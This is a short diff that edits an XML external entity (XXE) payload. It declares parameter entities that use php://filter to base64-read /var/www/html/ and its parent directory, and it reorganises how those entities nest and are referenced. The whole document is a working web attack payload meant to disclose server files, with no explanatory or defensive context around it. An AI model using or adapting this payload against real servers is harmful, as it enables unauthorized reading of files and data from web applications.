@@ -2,10 +2,8 @@
 <!DOCTYPE data [
     <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/">
     <!ENTITY % dir SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/..">
-    <!ENTITY % payload "<!ENTITY % list '%file;%dir;'>">
+    <!ENTITY % list "%file;%dir;">
 ]>
 <data>
-    %file;
-    %dir;
-    %payload;
+    %list;
 </data>
